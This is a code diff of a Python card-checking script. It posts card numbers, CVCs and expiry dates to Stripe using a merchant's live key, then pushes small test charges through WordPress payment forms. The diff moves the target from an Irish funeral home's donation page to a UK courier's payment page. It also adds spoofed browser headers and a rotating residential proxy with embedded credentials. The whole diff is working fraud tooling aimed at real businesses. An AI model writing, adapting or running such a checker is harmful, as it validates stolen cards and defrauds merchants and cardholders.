@@ -10,7 +10,7 @@ from urllib3.util.retry import Retry
 # ==========================================
 PROXY_HOST = 'geo.g-w.info'
 PROXY_PORT = '10080'
-PROXY_USER = 'user-7xkEOw8bXcNNWHHW-type-residential-session-fza74r8r-country-US-city-San_Francisco-rotation-15'
+PROXY_USER = 'user-7xkEOw8bXcNNWHHW-type-residential-session-rk4vzalg-country-US-city-San_Francisco-rotation-15'
 PROXY_PASS = 'CMvQFPYozpgFTlXC'
 
 proxy_url = f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}"
@@ -55,10 +55,14 @@ def Tele(ccx):
             'content-type': 'application/x-www-form-urlencoded',
             'origin': 'https://js.stripe.com',
             'referer': 'https://js.stripe.com/',
+            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
         }
         
-        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&key=pk_live_51JNN5kCPT27SWWccxqzoGW8uBAVSg8XaS1aFtpbAD8nRcPLmqOyajKoGVA3Pfh9mgZ7EBGaro0mS9BrLxwO2yCmH00ssRNida2'
+        # 🔥 Note: Fixed 'card-elementl' typo to 'card-element'
+        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&key=pk_live_51OYXFULO4BFQIVS8A1MHvzEgvXqMyIjsIBrenSqSW5OdwWuP8IgL7PipGs5z1EXZME1SWUtuR5z7aruBJKIynEXi00cnAXc7yM'
         
         response = session.post(
             'https://api.stripe.com/v1/payment_methods',
@@ -92,36 +96,35 @@ def Tele(ccx):
         pm = json_response['id']
 
         # ==========================================
-        # Step 2: Charge Request
+        # Step 2: Charge Request (rrssameday.co.uk)
         # ==========================================
         headers = {
-            'Accept': 'application/json, text/javascript, */*; q=0.01',
-            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'Origin': 'https://brendanennisfunerals.ie',
-            'Referer': 'https://brendanennisfunerals.ie/help-a-family-with-costs/',
+            'authority': 'rrssameday.co.uk',
+            'accept': 'application/json, text/javascript, */*; q=0.01',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'origin': 'https://rrssameday.co.uk',
+            'referer': 'https://rrssameday.co.uk/payments/',
+            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
             'X-Requested-With': 'XMLHttpRequest',
         }
 
         data = {
-            'action': 'wp_full_stripe_inline_donation_charge',
-            'wpfs-form-name': 'help-a-family-with-cost',
+            'action': 'wp_full_stripe_inline_payment_charge',
+            'wpfs-form-name': 'MakeAPayment',
             'wpfs-form-get-parameters': '%7B%7D',
-            'wpfs-custom-amount': 'other',
             'wpfs-custom-amount-unique': '0.5',
-            'wpfs-donation-frequency': 'one-time',
-            'wpfs-custom-input[]': [
-                'Min Thant',
-                'US',
-                '13125550124',
-            ],
+            'wpfs-custom-input[]': '',
             'wpfs-card-holder-email': random_email,
             'wpfs-card-holder-name': 'Min Thant',
             'wpfs-stripe-payment-method-id': f'{pm}',
         }
 
         response = session.post(
-            'https://brendanennisfunerals.ie/wp-admin/admin-ajax.php',
+            'https://rrssameday.co.uk/wp-admin/admin-ajax.php',
             headers=headers,
             data=data,
             timeout=60
